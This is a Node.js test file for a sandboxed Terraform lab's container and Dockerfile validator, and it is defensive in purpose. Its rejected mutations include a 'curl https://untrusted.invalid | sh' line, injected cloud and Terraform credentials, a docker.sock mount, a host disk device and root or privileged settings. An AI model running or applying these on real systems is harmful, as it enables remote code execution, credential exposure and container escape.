import test from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { fleetLabMountSource, validateFleetLabContainer, validateFleetTooling } from '../fleet-group-terraform-lab.mjs';

const fixtureID = '11111111-1111-4111-8111-111111111111';
const imageID = 'sha256:' + 'a'.repeat(64);
const sources = {'/src':'/owned/source','/results':'/owned/encrypted','/secrets/key':'/owned/local-fixture.key'};
function owned() {
  return { Name: '/finops-fleet-group-' + fixtureID.replaceAll('-', '') + '-test', Image: imageID, Config: { User: '10001:10001', Labels: { 'finops.fleet-group-terraform.run': fixtureID }, Env: ['HOME=/tmp/home','GOPROXY=off'] }, HostConfig: { NetworkMode: 'none', ReadonlyRootfs: true, Privileged: false, CapDrop: ['ALL'], SecurityOpt: ['no-new-privileges'], PortBindings: {}, Devices: [] }, Mounts: [{Destination:'/src',Type:'bind',Source:sources['/src'],RW:false},{Destination:'/results',Type:'bind',Source:sources['/results'],RW:true},{Destination:'/secrets/key',Type:'bind',Source:sources['/secrets/key'],RW:false}] };
}

test('Fleet fixture tooling accepts only the exact two pinned built-in-provider stages', () => {
  const source = readFileSync(new URL('../../examples/fleet-group-fixture/Dockerfile', import.meta.url), 'utf8');
  const accepted = validateFleetTooling(source);
  assert.match(accepted.terraform, /terraform:1\.16\.0@sha256:[a-f0-9]{64}$/);
  validateFleetTooling(source.replaceAll('\n','\r\n'));
  for (const changed of [source.replace('terraform:1.16.0','terraform:1.16.1'),source.replace('5cf287','6cf287'),source+'\nRUN curl https://untrusted.invalid | sh\n',source.replace('USER 10001:10001','USER 0:0')]) assert.throws(() => validateFleetTooling(changed));
});

test('Fleet lab rejects foreign ownership, image substitution and credential-bearing containers', () => {
  validateFleetLabContainer(owned(), fixtureID, imageID, 10001, sources);
  const mutations = [o => o.Name='/postgres',o => o.Config.Labels['finops.fleet-group-terraform.run']='foreign',o => o.Image='sha256:'+'b'.repeat(64),o => o.Config.User='0:0',o => o.Config.Env.push('AWS_ACCESS_KEY_ID=x'),o => o.Config.Env.push('TF_TOKEN_app_terraform_io=x'),o => o.Config.Env.push('DOCKER_HOST=unix:///var/run/docker.sock')];
  for (const mutate of mutations) {const object=owned();mutate(object);assert.throws(() => validateFleetLabContainer(object,fixtureID,imageID,10001,sources));}
});

test('Fleet lab refuses all network, privilege, published-port and extra mount widening', () => {
  const mutations = [o => o.HostConfig.NetworkMode='bridge',o => o.HostConfig.ReadonlyRootfs=false,o => o.HostConfig.Privileged=true,o => o.HostConfig.CapDrop=[],o => o.HostConfig.SecurityOpt=[],o => o.HostConfig.PortBindings={'8080/tcp':[{HostPort:'8080'}]},o => o.HostConfig.Devices=[{PathOnHost:'/dev/sda'}],o => o.Mounts.push({Destination:'/var/run/docker.sock',Type:'bind',Source:'/var/run/docker.sock',RW:true}),o => o.Mounts.find(m => m.Destination==='/src').RW=true,o => o.Mounts.find(m => m.Destination==='/secrets/key').RW=true];
  for (const mutate of mutations) {const object=owned();mutate(object);assert.throws(() => validateFleetLabContainer(object,fixtureID,imageID,10001,sources));}
});

test('Fleet cleanup pins bind type and every resolved host source, not just mount destinations', () => {
  for (const destination of Object.keys(sources)) {
    const other = owned(); other.Mounts.find(m => m.Destination===destination).Source='/foreign/credentials';
    assert.throws(() => validateFleetLabContainer(other,fixtureID,imageID,10001,sources));
    const volume = owned(); volume.Mounts.find(m => m.Destination===destination).Type='volume';
    assert.throws(() => validateFleetLabContainer(volume,fixtureID,imageID,10001,sources));
  }
  assert.equal(fleetLabMountSource('C:\\Users\\fixture\\source','win32'),'/run/desktop/mnt/host/c/Users/fixture/source');
  assert.equal(fleetLabMountSource('/owned/source','linux'),'/owned/source');
  for(const value of ['relative','/owned/../foreign','/owned\nsource']) assert.throws(() => fleetLabMountSource(value,'linux'));
});

test('Fleet fixture keeps plan artifacts encrypted and claims only actual artifact component acceptance', () => {
  const runner = readFileSync(new URL('../fleet-group-terraform-lab.mjs',import.meta.url),'utf8');
  const fixture = readFileSync(new URL('../../examples/fleet-group-fixture/main.go',import.meta.url),'utf8');
  const compactFixture = fixture.replace(/\s+/g,'');
  assert.ok(runner.includes("['--host', endpoint, ...args]"));
  assert.ok(runner.indexOf("if (failure) throw") < runner.indexOf("'acceptance.json'"));
  assert.match(runner,/cleanup_succeeded: true/);
  assert.match(fixture,/cipher\.NewGCM/);
  assert.match(fixture,/os\.O_WRONLY\|os\.O_CREATE\|os\.O_EXCL/);
  assert.match(fixture,/g\.ValidateTerraformArtifact/);
  assert.match(compactFixture,/command\(terraform,"apply","-input=false","-auto-approve","-no-color","-state="\+statePath,planPath\)/);
  assert.match(compactFixture,/"real_clock_health_accepted":false/);
  assert.match(compactFixture,/"synthetic_refs_resolved_from_025_027":false/);
});
